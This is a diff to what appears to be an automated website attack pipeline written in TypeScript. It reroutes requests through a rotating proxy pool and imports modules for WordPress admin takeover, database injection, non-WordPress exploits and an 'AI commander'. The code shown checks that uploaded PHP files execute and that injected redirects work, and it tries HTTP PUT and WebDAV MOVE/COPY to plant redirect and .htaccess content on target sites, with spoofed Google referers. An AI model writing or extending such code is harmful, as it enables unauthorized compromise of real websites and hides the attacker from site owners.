@@ -27,7 +27,7 @@ import { uploadContentToCdn, type CdnUploadResult } from "./content-cdn";
 import { sendTelegramNotification, type TelegramNotification } from "./telegram-notifier";
 import { runWpAdminTakeover, runShellExecFallback, type WpAdminConfig, type WpTakeoverResult } from "./wp-admin-takeover";
 import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } from "./wp-db-injection";
-import { proxyPool } from "./proxy-pool";
+import { proxyPool, fetchWithPoolProxy } from "./proxy-pool";
 import { runShelllessAttacks, type ShelllessResult, type ShelllessConfig } from "./shellless-attack-engine";
 import { runAiCommander, type AiCommanderResult, type AiCommanderEvent } from "./ai-autonomous-engine";
 import { runNonWpExploits, type NonWpScanResult, type ExploitResult } from "./non-wp-exploits";
@@ -166,7 +166,8 @@ async function followRedirectChain(startUrl: string, maxHops = 10): Promise<{ ch
 
   for (let i = 0; i < maxHops; i++) {
     try {
-      const resp = await fetch(currentUrl, {
+      const targetDomain = currentUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+      const { response: resp } = await fetchWithPoolProxy(currentUrl, {
         method: "GET",
         redirect: "manual",
         headers: {
@@ -174,7 +175,7 @@ async function followRedirectChain(startUrl: string, maxHops = 10): Promise<{ ch
           "Referer": "https://www.google.com/search?q=test",
         },
         signal: AbortSignal.timeout(8000),
-      });
+      }, { targetDomain, timeout: 8000 });
       finalStatus = resp.status;
 
       if (resp.status >= 300 && resp.status < 400) {
@@ -221,14 +222,15 @@ async function verifyUploadedFile(
 ): Promise<VerificationResult> {
   try {
     // ─── Step 1: Check if file is accessible (not 403/404) ───
-    const resp = await fetch(fileUrl, {
+    const vfDomain = fileUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+    const { response: resp } = await fetchWithPoolProxy(fileUrl, {
       method: "GET",
       redirect: "manual",
       headers: {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
       },
       signal: AbortSignal.timeout(10000),
-    });
+    }, { targetDomain: vfDomain, timeout: 10000 });
 
     const httpStatus = resp.status;
 
@@ -246,11 +248,11 @@ async function verifyUploadedFile(
     let phpNotExecuting = false;
     if (fileUrl.endsWith(".php") && httpStatus === 200) {
       try {
-        const phpCheckResp = await fetch(fileUrl, {
+        const { response: phpCheckResp } = await fetchWithPoolProxy(fileUrl, {
           method: "GET",
           headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
           signal: AbortSignal.timeout(10000),
-        });
+        }, { targetDomain: vfDomain, timeout: 10000 });
         const phpBody = await phpCheckResp.text();
         if (phpBody.includes("<?php") || phpBody.includes("@ini_set") || phpBody.includes("$_SERVER") || phpBody.includes('header("')) {
           phpNotExecuting = true;
@@ -299,14 +301,14 @@ async function verifyUploadedFile(
     // ─── Step 4: Check body for JS/meta redirect if no server-side redirect ───
     if (!redirectWorks && (httpStatus === 200 || httpStatus === 301 || httpStatus === 302)) {
       try {
-        const bodyResp = await fetch(triggerUrl, {
+        const { response: bodyResp } = await fetchWithPoolProxy(triggerUrl, {
           method: "GET",
           headers: {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "Referer": "https://www.google.com/search?q=test",
           },
           signal: AbortSignal.timeout(10000),
-        });
+        }, { targetDomain: vfDomain, timeout: 10000 });
         const body = await bodyResp.text();
         const hasJsRedirect = body.includes("window.location") || body.includes("location.replace") || body.includes("location.href");
         const hasMetaRedirect = body.includes('http-equiv="refresh"') || body.includes("http-equiv='refresh'");
@@ -1931,12 +1933,13 @@ export async function runUnifiedAttackPipeline(
                     : htmlRedirect;
 
                   // Try PUT
-                  const putResp = await fetch(uploadPath, {
+                  const putResult = await fetchWithPoolProxy(uploadPath, {
                     method: "PUT",
                     headers: { "Content-Type": isHtaccess ? "text/plain" : "text/html" },
                     body: content,
                     signal: AbortSignal.timeout(10000),
-                  }).catch(() => null);
+                  }, { targetDomain: config.targetUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, ""), timeout: 10000 }).catch(() => null);
+                  const putResp = putResult?.response || null;
 
                   if (putResp && (putResp.ok || putResp.status === 201)) {
                     onEvent({
@@ -1983,14 +1986,15 @@ export async function runUnifiedAttackPipeline(
             if (!autoExecuteSuccess) {
               for (const httpMethod of ["MOVE", "COPY"]) {
                 try {
-                  const resp = await fetch(config.targetUrl, {
+                  const moveResult = await fetchWithPoolProxy(config.targetUrl, {
                     method: httpMethod,
                     headers: {
                       "Destination": config.redirectUrl,
                       "Overwrite": "T",
                     },
                     signal: AbortSignal.timeout(8000),
-                  }).catch(() => null);
+                  }, { targetDomain: config.targetUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, ""), timeout: 8000 }).catch(() => null);
+                  const resp = moveResult?.response || null;
                   if (resp && (resp.ok || resp.status === 201 || resp.status === 204)) {
                     const verifyResult = await verifyUploadedFile(config.targetUrl, config.redirectUrl, onEvent);
                     if (verifyResult.redirectWorks) {
